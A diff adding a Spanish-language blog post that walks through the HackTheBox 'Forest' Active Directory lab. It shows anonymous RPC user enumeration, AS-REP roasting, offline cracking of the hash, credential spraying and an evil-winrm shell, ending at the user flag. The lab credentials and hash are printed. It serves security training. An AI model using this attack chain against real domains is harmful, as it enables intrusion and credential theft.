@@ -1,0 +1,916 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Forest (easy) | MiguelRega7 - blog</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="HackTheBox - Forest (easy)" />
+<meta name="author" content="MiguelRega7" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<meta property="og:description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<link rel="canonical" href="http://localhost:4000/hackthebox/machines/easy/2024/04/02/forest.html" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/machines/easy/2024/04/02/forest.html" />
+<meta property="og:site_name" content="MiguelRega7 - blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-04-02T00:00:00-06:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HackTheBox - Forest (easy)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"MiguelRega7"},"dateModified":"2024-04-02T00:00:00-06:00","datePublished":"2024-04-02T00:00:00-06:00","description":"Posts sobre resolución de CTFs y ciberseguridad.","headline":"HackTheBox - Forest (easy)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/machines/easy/2024/04/02/forest.html"},"url":"http://localhost:4000/hackthebox/machines/easy/2024/04/02/forest.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="MiguelRega7 - blog" />
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">MiguelRega7 - blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">HackTheBox - Forest (easy)</h1>
+    <p class="post-meta"><time class="dt-published" datetime="2024-04-02T00:00:00-06:00" itemprop="datePublished">
+        Apr 2, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p align="center">
+<img src="https://labs.hackthebox.com/storage/avatars/7dedecb452597150647e73c2dd6c24c7.png" />
+</p>
+
+<ul>
+  <li>En este post vamos a resolver la maquina Forest que contempla Active Directory mediante una enumeracion por RPC vamos a poder obtender un listado potencial de usuarios para poder hacer un AS-RepRoast attack y obtener el Hash de un usuario para poder crackearlo y conectarnos mediante evil-winrm para la escalada de privilegios estaremos empleando BloodHound para poder ver la forma de escalar privilegios y hacer un DCSync para agregar un nuevo usuario al dominio y usar Secretsdump.py para obtener el hash del usuario administrator y poder conectarnos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.10.10.161
+PING 10.10.10.161 <span class="o">(</span>10.10.10.161<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from 10.10.10.161: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>127 <span class="nb">time</span><span class="o">=</span>112 ms
+
+<span class="nt">---</span> 10.10.10.161 ping statistics <span class="nt">---</span>
+1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
+rtt min/avg/max/mdev <span class="o">=</span> 112.170/112.170/112.170/0.000 ms
+❯ whichSystem.py 10.10.10.161
+
+10.10.10.161 <span class="o">(</span>ttl -&gt; 127<span class="o">)</span>: Windows
+</code></pre></div></div>
+
+<h2 id="portscan">PortScan</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,88,135,139,445,464,49665,49684,389,636,5985,47001,3269 10.10.10.161 <span class="nt">-oN</span> targeted
+Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-06-17 17:10 CST
+Nmap scan report <span class="k">for </span>10.10.10.161
+Host is up <span class="o">(</span>0.12s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT      STATE SERVICE      VERSION
+53/tcp    open  domain       Simple DNS Plus
+88/tcp    open  kerberos-sec Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2023-06-17 23:17:49Z<span class="o">)</span>
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp   open  ldap         Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: htb.local, Site: Default-First-Site-Name<span class="o">)</span>
+445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds <span class="o">(</span>workgroup: HTB<span class="o">)</span>
+464/tcp   open  kpasswd5?
+636/tcp   open  tcpwrapped
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49665/tcp open  msrpc        Microsoft Windows RPC
+49684/tcp open  msrpc        Microsoft Windows RPC
+Service Info: Host: FOREST<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   <span class="nb">date</span>: 2023-06-17T23:18:45
+|_  start_date: 2023-06-17T23:12:48
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 <span class="o">(</span>Windows Server 2016 Standard 6.3<span class="o">)</span>
+|   Computer name: FOREST
+|   NetBIOS computer name: FOREST<span class="se">\x</span>00
+|   Domain name: htb.local
+|   Forest name: htb.local
+|   FQDN: FOREST.htb.local
+|_  System <span class="nb">time</span>: 2023-06-17T16:18:42-07:00
+|_clock-skew: mean: 2h26m49s, deviation: 4h02m30s, median: 6m48s
+| smb-security-mode: 
+|   account_used: &lt;blank&gt;
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+</code></pre></div></div>
+
+<h2 id="enumeracion">Enumeracion</h2>
+
+<ul>
+  <li>Vamos a comenzar usando <strong>crackmapexec</strong> para ver ante que estamos y el nombre del dominio.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.161
+SMB         10.10.10.161    445    FOREST           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2016 Standard 14393 x64 <span class="o">(</span>name:FOREST<span class="o">)</span> <span class="o">(</span>domain:htb.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora lo agregamos al <strong>/etc/hosts</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">echo</span> <span class="s2">"10.10.10.161 htb.local"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
+10.10.10.161 htb.local
+❯ ping <span class="nt">-c</span> 1 htb.local
+PING htb.local <span class="o">(</span>10.10.10.161<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from htb.local <span class="o">(</span>10.10.10.161<span class="o">)</span>: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>127 <span class="nb">time</span><span class="o">=</span>109 ms
+
+<span class="nt">---</span> htb.local ping statistics <span class="nt">---</span>
+1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
+rtt min/avg/max/mdev <span class="o">=</span> 109.072/109.072/109.072/0.000 ms
+</code></pre></div></div>
+
+<ul>
+  <li>Si listamos los recursos compartidos a nivel de red por <strong>SMB</strong> vemos que aunque hagamos un <strong>Null Session</strong> no hay nada.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient <span class="nt">-L</span> 10.10.10.161 <span class="nt">-N</span>
+Anonymous login successful
+
+	Sharename       Type      Comment
+	<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
+SMB1 disabled <span class="nt">--</span> no workgroup available
+</code></pre></div></div>
+
+<ul>
+  <li>Si probamos con otra herramienta que es <strong>smbmap</strong> no encontramos nada.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.161
+<span class="o">[</span>+] IP: 10.10.10.161:445	Name: htb.local    
+</code></pre></div></div>
+
+<ul>
+  <li>Bueno vamos a seguir enumerando para encontrar mas cosas vamos a seguir con el puerto con la herramienta <strong>rpcclient</strong> para encontrar usuarios del dominio validos sin proporcionar ninguna credencial por que no tenemos ninguna asta el momento.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rpcclient 10.10.10.161 <span class="nt">-N</span> <span class="nt">-U</span> <span class="s1">''</span> <span class="nt">-c</span> enumdomusers
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[DefaultAccount] rid:[0x1f7]
+user:[<span class="nv">$331000</span><span class="nt">-VK4ADACQNUCA</span><span class="o">]</span> rid:[0x463]
+user:[SM_2c8eef0a09b545acb] rid:[0x464]
+user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
+user:[SM_75a538d3025e4db9a] rid:[0x466]
+user:[SM_681f53d4942840e18] rid:[0x467]
+user:[SM_1b41c9286325456bb] rid:[0x468]
+user:[SM_9b69f1b9d2cc45549] rid:[0x469]
+user:[SM_7c96b981967141ebb] rid:[0x46a]
+user:[SM_c75ee099d0a64c91b] rid:[0x46b]
+user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
+user:[HealthMailboxc3d7722] rid:[0x46e]
+user:[HealthMailboxfc9daad] rid:[0x46f]
+user:[HealthMailboxc0a90c9] rid:[0x470]
+user:[HealthMailbox670628e] rid:[0x471]
+user:[HealthMailbox968e74d] rid:[0x472]
+user:[HealthMailbox6ded678] rid:[0x473]
+user:[HealthMailbox83d6781] rid:[0x474]
+user:[HealthMailboxfd87238] rid:[0x475]
+user:[HealthMailboxb01ac64] rid:[0x476]
+user:[HealthMailbox7108a4e] rid:[0x477]
+user:[HealthMailbox0659cc1] rid:[0x478]
+user:[sebastien] rid:[0x479]
+user:[lucinda] rid:[0x47a]
+user:[svc-alfresco] rid:[0x47b]
+user:[andy] rid:[0x47e]
+user:[mark] rid:[0x47f]
+user:[santi] rid:[0x480]
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos agregar a los usuarios a una lista.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rpcclient 10.10.10.161 <span class="nt">-N</span> <span class="nt">-U</span> <span class="s1">''</span> <span class="nt">-c</span> enumdomusers | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s2">"</span><span class="se">\[</span><span class="s2">.*?</span><span class="se">\]</span><span class="s2">"</span> | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"0x"</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'[]'</span> <span class="o">&gt;</span> <span class="nb">users</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora vamos a usar <code class="language-plaintext highlighter-rouge">GetNPUsers.py</code> para hacer un <strong>ASREPRoast</strong>  <strong>Attack</strong> para ver si podemos obtener los TGT de algún usuario para crackear de manera offline.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/forest/web1.png" />
+</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ GetNPUsers.py htb.local/ <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> <span class="nb">users
+</span>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+<span class="o">[</span>-] User Administrator doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] User HealthMailboxc3d7722 doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User HealthMailboxfc9daad doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User HealthMailboxc0a90c9 doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User HealthMailbox670628e doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User HealthMailbox968e74d doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User HealthMailbox6ded678 doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User HealthMailbox83d6781 doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User HealthMailboxfd87238 doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User HealthMailboxb01ac64 doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User HealthMailbox7108a4e doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User HealthMailbox0659cc1 doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User sebastien doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User lucinda doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="nv">$krb5asrep$23$svc</span><span class="nt">-alfresco</span>@HTB.LOCAL:716b97133f6420642caaa47244cab7bf<span class="nv">$e524765fb6fadd45ffb7c2427cd8a6485d4aa6401627b112e337aee60999241895e1fba1736cb5389b0d0738bb893ab5c480b6248d9557d4abf2d396ac85561c8210ef8658e52986463a1e35bade45d57394d63dacad45a3799f2a58286146cea55ebabe787b49bb4caeeac2ea809ab02bc491c68cf030ba26bdc1a21bf8dfa2e75d8546a09d85cfc92c81421bcd9a291a53cc6646c93372b0b633b365b46651d3d99ba6f25358c9ba04c82d4ceb52a076c33365ba69ab11a91a66eab5a228faee38f3b4709ef68c79bfdc1cf37861a192ff03b5950853a0cecf6ded74d5448e516d424e6713</span>
+<span class="o">[</span>-] User andy doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User mark doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User santi doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+</span></code></pre></div></div>
+
+<ul>
+  <li>Tenemos un Hash del usuario <code class="language-plaintext highlighter-rouge">svc_alfresco</code> ya que el usuario es <strong>ASREP Roastable</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ catn <span class="nb">hash</span>
+<span class="nv">$krb5asrep$23$svc</span><span class="nt">-alfresco</span>@HTB.LOCAL:716b97133f6420642caaa47244cab7bf<span class="nv">$e524765fb6fadd45ffb7c2427cd8a6485d4aa6401627b112e337aee60999241895e1fba1736cb5389b0d0738bb893ab5c480b6248d9557d4abf2d396ac85561c8210ef8658e52986463a1e35bade45d57394d63dacad45a3799f2a58286146cea55ebabe787b49bb4caeeac2ea809ab02bc491c68cf030ba26bdc1a21bf8dfa2e75d8546a09d85cfc92c81421bcd9a291a53cc6646c93372b0b633b365b46651d3d99ba6f25358c9ba04c82d4ceb52a076c33365ba69ab11a91a66eab5a228faee38f3b4709ef68c79bfdc1cf37861a192ff03b5950853a0cecf6ded74d5448e516d424e6713</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora vamos a crakearlo.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
+</span>Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>krb5asrep, Kerberos 5 AS-REP etype 17/18/23 <span class="o">[</span>MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x]<span class="o">)</span>
+Will run 2 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+s3rvice          <span class="o">(</span><span class="nv">$krb5asrep$23$svc</span><span class="nt">-alfresco</span>@HTB.LOCAL<span class="o">)</span>
+1g 0:00:00:08 DONE <span class="o">(</span>2023-06-17 18:04<span class="o">)</span> 0.1116g/s 456000p/s 456000c/s 456000C/s s4553592..s3r2s1
+Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
+Session completed
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Tenemos credenciales <strong>svc-alfresco:s3rvice</strong>.</p>
+  </li>
+  <li>
+    <p>Y bueno podemos conectarnos con <code class="language-plaintext highlighter-rouge">evil-winrm</code> con las credenciales.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec winrm 10.10.10.161 <span class="nt">-u</span> <span class="s1">'svc-alfresco'</span> <span class="nt">-p</span> <span class="s1">'s3rvice'</span>
+SMB         10.10.10.161    5985   FOREST           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 14393 <span class="o">(</span>name:FOREST<span class="o">)</span> <span class="o">(</span>domain:htb.local<span class="o">)</span>
+HTTP        10.10.10.161    5985   FOREST           <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.10.10.161:5985/wsman
+WINRM       10.10.10.161    5985   FOREST           <span class="o">[</span>+] htb.local<span class="se">\s</span>vc-alfresco:s3rvice <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Antes de hacerlo para enumerar un poco mas ahora que tenemos credenciales.</p>
+  </li>
+  <li>
+    <p>De primeras vemos que nadie mas reutiliza la contraseña.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec winrm 10.10.10.161 <span class="nt">-u</span> <span class="nb">users</span> <span class="nt">-p</span> <span class="s1">'s3rvice'</span>
+SMB         10.10.10.161    5985   FOREST           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 14393 <span class="o">(</span>name:FOREST<span class="o">)</span> <span class="o">(</span>domain:htb.local<span class="o">)</span>
+HTTP        10.10.10.161    5985   FOREST           <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.10.10.161:5985/wsman
+WINRM       10.10.10.161    5985   FOREST           <span class="o">[</span>-] htb.local<span class="se">\A</span>dministrator:s3rvice
+WINRM       10.10.10.161    5985   FOREST           <span class="o">[</span>-] htb.local<span class="se">\G</span>uest:s3rvice
+WINRM       10.10.10.161    5985   FOREST           <span class="o">[</span>-] htb.local<span class="se">\k</span>rbtgt:s3rvice
+WINRM       10.10.10.161    5985   FOREST           <span class="o">[</span>-] htb.local<span class="se">\D</span>efaultAccount:s3rvice
+WINRM       10.10.10.161    5985   FOREST           <span class="o">[</span>-] htb.local<span class="se">\$</span>331000-VK4ADACQNUCA:s3rvice
+WINRM       10.10.10.161    5985   FOREST           <span class="o">[</span>-] htb.local<span class="se">\S</span>M_2c8eef0a09b545acb:s3rvice
+WINRM       10.10.10.161    5985   FOREST           <span class="o">[</span>-] htb.local<span class="se">\S</span>M_ca8c2ed5bdab4dc9b:s3rvice
+WINRM       10.10.10.161    5985   FOREST           <span class="o">[</span>-] htb.local<span class="se">\S</span>M_75a538d3025e4db9a:s3rvice
+WINRM       10.10.10.161    5985   FOREST           <span class="o">[</span>-] htb.local<span class="se">\S</span>M_681f53d4942840e18:s3rvice
+WINRM       10.10.10.161    5985   FOREST           <span class="o">[</span>-] htb.local<span class="se">\S</span>M_1b41c9286325456bb:s3rvice
+WINRM       10.10.10.161    5985   FOREST           <span class="o">[</span>-] htb.local<span class="se">\S</span>M_9b69f1b9d2cc45549:s3rvice
+WINRM       10.10.10.161    5985   FOREST           <span class="o">[</span>-] htb.local<span class="se">\S</span>M_7c96b981967141ebb:s3rvice
+WINRM       10.10.10.161    5985   FOREST           <span class="o">[</span>-] htb.local<span class="se">\S</span>M_c75ee099d0a64c91b:s3rvice
+WINRM       10.10.10.161    5985   FOREST           <span class="o">[</span>-] htb.local<span class="se">\S</span>M_1ffab36a2f5f479cb:s3rvice
+WINRM       10.10.10.161    5985   FOREST           <span class="o">[</span>-] htb.local<span class="se">\H</span>ealthMailboxc3d7722:s3rvice
+WINRM       10.10.10.161    5985   FOREST           <span class="o">[</span>-] htb.local<span class="se">\H</span>ealthMailboxfc9daad:s3rvice
+WINRM       10.10.10.161    5985   FOREST           <span class="o">[</span>-] htb.local<span class="se">\H</span>ealthMailboxc0a90c9:s3rvice
+WINRM       10.10.10.161    5985   FOREST           <span class="o">[</span>-] htb.local<span class="se">\H</span>ealthMailbox670628e:s3rvice
+WINRM       10.10.10.161    5985   FOREST           <span class="o">[</span>-] htb.local<span class="se">\H</span>ealthMailbox968e74d:s3rvice
+WINRM       10.10.10.161    5985   FOREST           <span class="o">[</span>-] htb.local<span class="se">\H</span>ealthMailbox6ded678:s3rvice
+WINRM       10.10.10.161    5985   FOREST           <span class="o">[</span>-] htb.local<span class="se">\H</span>ealthMailbox83d6781:s3rvice
+WINRM       10.10.10.161    5985   FOREST           <span class="o">[</span>-] htb.local<span class="se">\H</span>ealthMailboxfd87238:s3rvice
+WINRM       10.10.10.161    5985   FOREST           <span class="o">[</span>-] htb.local<span class="se">\H</span>ealthMailboxb01ac64:s3rvice
+WINRM       10.10.10.161    5985   FOREST           <span class="o">[</span>-] htb.local<span class="se">\H</span>ealthMailbox7108a4e:s3rvice
+WINRM       10.10.10.161    5985   FOREST           <span class="o">[</span>-] htb.local<span class="se">\H</span>ealthMailbox0659cc1:s3rvice
+WINRM       10.10.10.161    5985   FOREST           <span class="o">[</span>-] htb.local<span class="se">\s</span>ebastien:s3rvice
+WINRM       10.10.10.161    5985   FOREST           <span class="o">[</span>-] htb.local<span class="se">\l</span>ucinda:s3rvice
+WINRM       10.10.10.161    5985   FOREST           <span class="o">[</span>+] htb.local<span class="se">\s</span>vc-alfresco:s3rvice <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Tenemos permiso de lectura en esos recursos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.161 <span class="nt">-u</span> <span class="s1">'svc-alfresco'</span> <span class="nt">-p</span> <span class="s1">'s3rvice'</span> <span class="nt">--shares</span>
+SMB         10.10.10.161    445    FOREST           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2016 Standard 14393 x64 <span class="o">(</span>name:FOREST<span class="o">)</span> <span class="o">(</span>domain:htb.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+SMB         10.10.10.161    445    FOREST           <span class="o">[</span>+] htb.local<span class="se">\s</span>vc-alfresco:s3rvice 
+SMB         10.10.10.161    445    FOREST           <span class="o">[</span>+] Enumerated shares
+SMB         10.10.10.161    445    FOREST           Share           Permissions     Remark
+SMB         10.10.10.161    445    FOREST           <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
+SMB         10.10.10.161    445    FOREST           ADMIN<span class="nv">$ </span>                         Remote Admin
+SMB         10.10.10.161    445    FOREST           C<span class="nv">$ </span>                             Default share
+SMB         10.10.10.161    445    FOREST           IPC<span class="nv">$ </span>                           Remote IPC
+SMB         10.10.10.161    445    FOREST           NETLOGON        READ            Logon server share 
+SMB         10.10.10.161    445    FOREST           SYSVOL          READ            Logon server share 
+</code></pre></div></div>
+
+<ul>
+  <li>Nos podemos conectar a cualquier recurso compartido donde tengamos privilegio de lectura pero enumerando no encontré nada interesante.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient //10.10.10.161/SYSVOL <span class="nt">-U</span> svc-alfresco%s3rvice
+Try <span class="s2">"help"</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> 
+</code></pre></div></div>
+
+<h2 id="shell-as-svc-alfresco">Shell as svc-alfresco</h2>
+
+<ul>
+  <li>Bueno después de enumerar otras cosas que no encontré muchas cosas vamos a conectarnos con <code class="language-plaintext highlighter-rouge">evil-winrm</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ evil-winrm <span class="nt">-i</span> 10.10.10.161 <span class="nt">-u</span> <span class="s1">'svc-alfresco'</span> <span class="nt">-p</span> <span class="s1">'s3rvice'</span>
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-alfresco<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
+</span>htb<span class="se">\s</span>vc-alfresco
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-alfresco<span class="se">\D</span>ocuments&gt; 
+</code></pre></div></div>
+
+<h2 id="usertxt">User.txt</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-alfresco<span class="se">\D</span>ocuments&gt; Get-ChildItem <span class="nt">-Path</span> C:<span class="se">\ </span><span class="nt">-Recurse</span> <span class="nt">-Filter</span> <span class="s2">"user.txt"</span> <span class="nt">-ErrorAction</span> SilentlyContinue
+
+
+    Directory: C:<span class="se">\U</span>sers<span class="se">\s</span>vc-alfresco<span class="se">\D</span>esktop
+
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+<span class="nt">-ar---</span>        6/17/2023   4:13 PM             34 user.txt
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-alfresco<span class="se">\D</span>ocuments&gt;
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-alfresco<span class="se">\D</span>esktop&gt; <span class="nb">type </span>user.txt
+536a6fbc33b268f9ab9687239d4db372
